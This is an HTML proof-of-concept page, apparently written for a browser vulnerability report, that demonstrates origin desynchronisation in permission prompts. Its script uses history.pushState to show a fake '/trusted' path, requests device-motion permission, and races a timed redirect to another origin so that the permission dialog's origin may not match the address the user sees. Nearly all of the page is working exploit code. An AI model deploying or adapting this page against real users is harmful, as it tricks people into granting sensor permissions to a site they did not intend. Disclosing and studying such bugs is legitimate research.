<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Location & Motion Origin Desync PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, system-ui;
  background: #f5f5f7;
}

button {
  font-size: 15px;
  padding: 10px 14px;
  border-radius: 10px;
  border: none;
  background: #007aff;
  color: #fff;
  margin: 6px;
}

#panel {
  display: none;
  max-width: 420px;
  margin: 80px auto;
  background: #fff;
  padding: 24px;
  border-radius: 16px;
  box-shadow: 0 20px 60px rgba(0,0,0,.2);
  text-align: center;
}

.notice {
  margin-top: 14px;
  font-size: 13px;
  color: #b00020;
}
</style>
</head>

<body>

<div style="text-align:center; margin-top:60px;">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Request Sensitive Permissions</h2>
  <p>Tap a button and observe the origin shown in the permission dialog.</p>

  <button onclick="reqMotion()">🧭 Enable Motion</button>

  <p id="output">Result: -</p>

  <div class="notice">
    Demo only — origin in permission UI may not match user-visible origin
  </div>
</div>

<script>
const panel  = document.getElementById('panel');
const output = document.getElementById('output');

/* ================= PERMISSIONS ================= */


function reqMotion() {
  if (typeof DeviceMotionEvent?.requestPermission === 'function') {
    DeviceMotionEvent.requestPermission()
      .then(res => output.textContent = 'Motion: ' + res)
      .catch(() => output.textContent = 'Motion denied');
  } else {
    output.textContent = 'Motion permission API not supported';
  }
}

/* ================= ORIGIN DESYNC LOGIC ================= */

/* Step 1: manipulate visible URL */
document.getElementById('trigger').onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
};

/* Step 2: navigation race */
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090';
      }, 80);
    });
  });
});
</script>

</body>
</html>
